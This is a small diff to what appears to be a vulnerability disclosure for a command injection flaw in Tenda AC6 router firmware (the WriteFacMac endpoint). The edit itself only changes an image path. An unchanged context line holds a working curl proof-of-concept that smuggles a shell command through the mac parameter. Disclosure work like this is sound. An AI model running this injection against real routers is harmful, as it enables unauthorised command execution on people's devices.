@@ -24,4 +24,4 @@ Tenda AC6 V15.03.06.23 was found to contain a command injection vulnerability in
 curl http://192.168.0.1/goform/WriteFacMac?mac=;ls%20%3E%20/tmp/1.txt;
 ```
 
-![image-20250413210610225](D:\0Project\IOT\AutoPostCve\VulnForIoT\Tenda_AC\AC6_formWriteFacMac\readme.assets\image-20250413210610225.png)
+![image-20250413210610225](./img/3.png)
